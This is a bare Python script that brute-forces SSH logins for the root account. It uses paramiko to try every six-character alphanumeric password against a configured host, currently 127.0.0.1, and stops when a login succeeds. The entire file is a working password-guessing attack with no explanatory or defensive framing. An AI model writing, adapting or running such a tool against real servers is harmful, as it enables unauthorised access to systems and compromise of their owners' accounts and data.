import paramiko
import itertools
import time
import string

host = "127.0.0.1"
username = "root"


def generate_passwords():
    alphanumeric = string.ascii_letters + string.digits
    for password in itertools.product(alphanumeric, repeat=6):
        yield ''.join(password)


def attempt_ssh_connection(password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname=host, username=username, password=password, timeout=3)
        print(f"Found password: {password}")
        return True
    except paramiko.AuthenticationException:
        return False
    except Exception as e:
        print(f"Error occurred: {str(e)}")
        return False
    finally:
        client.close()


for password in generate_passwords():
    if attempt_ssh_connection(password):
        break

